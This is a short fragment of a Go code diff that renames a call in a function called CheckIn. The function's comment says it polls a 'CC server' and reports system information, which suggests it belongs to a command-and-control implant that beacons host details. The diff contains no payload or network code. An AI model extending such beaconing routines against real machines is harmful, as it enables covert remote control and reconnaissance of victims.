@@ -19,7 +19,7 @@ import (
 
 // CheckIn poll CC server and report its system info
 func CheckIn() error {
-	info := collectSystemInfo()
+	info := CollectSystemInfo()
 
 	sysinfoJSON, err := json.Marshal(info)
 	if err != nil {
